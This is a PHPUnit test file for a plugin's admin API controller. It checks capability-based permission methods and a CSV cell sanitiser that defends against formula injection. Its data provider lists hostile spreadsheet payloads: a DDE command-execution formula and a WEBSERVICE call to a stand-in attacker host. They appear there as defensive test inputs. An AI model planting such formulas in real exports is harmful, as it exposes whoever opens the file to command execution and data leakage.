<?php

declare(strict_types=1);

namespace Stride\Tests\Unit;

use Stride\Admin\AdminAPIController;
use Stride\Modules\Attendance\AttendanceRepository;
use Stride\Modules\Edition\EditionRepository;
use Stride\Modules\Edition\SessionRepository;
use Stride\Tests\TestCase;

/**
 * Unit tests for AdminAPIController permission methods.
 *
 * Run: ddev exec vendor/bin/phpunit --filter AdminAPIController --testsuite Unit
 */
class AdminAPIControllerTest extends TestCase
{
    private AdminAPIController $controller;

    protected function setUp(): void
    {
        parent::setUp();

        // Reset capability stubs to prevent leaking between tests
        global $current_user_caps;
        $current_user_caps = null;

        $this->controller = new AdminAPIController(
            $this->createMock(AttendanceRepository::class),
            $this->createMock(EditionRepository::class),
            $this->createMock(SessionRepository::class),
        );
    }

    protected function tearDown(): void
    {
        global $current_user_caps;
        $current_user_caps = null;

        parent::tearDown();
    }

    // =========================================================================
    // canViewAdmin
    // =========================================================================

    /**
     * @test
     */
    public function canViewAdminReturnsTrueWithStrideView(): void
    {
        global $current_user_caps;
        $current_user_caps = ['stride_view' => true];

        $this->assertTrue($this->controller->canViewAdmin());
    }

    /**
     * @test
     */
    public function canViewAdminReturnsFalseWithoutStrideView(): void
    {
        global $current_user_caps;
        $current_user_caps = ['read' => true];

        $this->assertFalse($this->controller->canViewAdmin());
    }

    // =========================================================================
    // canManageAdmin
    // =========================================================================

    /**
     * @test
     */
    public function canManageAdminReturnsTrueWithStrideManage(): void
    {
        global $current_user_caps;
        $current_user_caps = ['stride_manage' => true, 'stride_view' => true];

        $this->assertTrue($this->controller->canManageAdmin());
    }

    /**
     * @test
     */
    public function canManageAdminReturnsFalseWithOnlyStrideView(): void
    {
        global $current_user_caps;
        $current_user_caps = ['stride_view' => true];

        $this->assertFalse($this->controller->canManageAdmin());
    }

    /**
     * @test
     */
    public function canManageAdminReturnsFalseWithNoCaps(): void
    {
        global $current_user_caps;
        $current_user_caps = [];

        $this->assertFalse($this->controller->canManageAdmin());
    }

    // =========================================================================
    // sanitizeCsvCell — CSV / formula injection neutraliser (C1)
    // =========================================================================

    /**
     * @test
     * @dataProvider csvInjectionVectors
     */
    public function sanitizeCsvCellPrefixesFormulaTriggers(string $input, string $expected): void
    {
        $ref = new \ReflectionMethod(AdminAPIController::class, 'sanitizeCsvCell');
        $ref->setAccessible(true);

        $this->assertSame($expected, $ref->invoke(null, $input));
    }

    /**
     * @return array<string, array{0: string, 1: string}>
     */
    public static function csvInjectionVectors(): array
    {
        return [
            'equals'        => ['=cmd|\'/C calc\'!A1', "'=cmd|'/C calc'!A1"],
            'webservice'    => ['=WEBSERVICE("http://evil.test")', "'=WEBSERVICE(\"http://evil.test\")"],
            'plus'          => ['+1+1', "'+1+1"],
            'minus'         => ['-2+3', "'-2+3"],
            'at'            => ['@SUM(A1)', "'@SUM(A1)"],
            'tab'           => ["\t=1", "'\t=1"],
            'carriage'      => ["\r=1", "'\r=1"],
            'safe_name'     => ['Jan Janssens', 'Jan Janssens'],
            'safe_email'    => ['user@example.test', 'user@example.test'],
            'empty'         => ['', ''],
            'numeric_safe'  => ['12345', '12345'],
            'leading_space' => [' =1', ' =1'],
        ];
    }
}
